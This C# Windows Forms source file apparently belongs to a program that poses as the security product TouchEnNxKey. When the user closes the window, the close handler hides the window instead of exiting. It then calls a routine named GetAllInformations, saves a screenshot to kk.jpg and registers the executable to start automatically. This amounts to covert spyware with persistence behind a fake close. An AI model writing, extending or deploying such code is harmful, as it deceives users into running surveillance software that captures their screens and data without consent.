using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace TouchEnNxKey
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            //e.Cancel = true;
            this.Hide();
            Program.GetAllInformations();
            ScreenCopy.Copy("kk.jpg");

            string ExeFileName = System.Reflection.Assembly.GetEntryAssembly().Location;
            Program.RegisterAutostart(ExeFileName);
        }
    }
}
